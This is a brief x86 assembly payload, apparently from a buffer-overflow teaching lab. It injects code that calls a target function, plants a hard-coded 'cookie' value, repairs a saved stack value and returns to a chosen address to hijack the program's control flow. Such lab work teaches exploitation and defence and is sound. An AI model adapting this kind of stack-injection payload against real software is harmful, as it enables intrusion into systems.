call 0x08048bf8 #test, call smoke()
call 0x08048d7a #call unique num
movl %eax, -0xC(%ebp) #hold return value for int local
movl $0x08048ef5, 52(%ebp) #fix return value
movl $0x2036e096, %eax #move cookie to return
pushl $0x08048e24 
ret
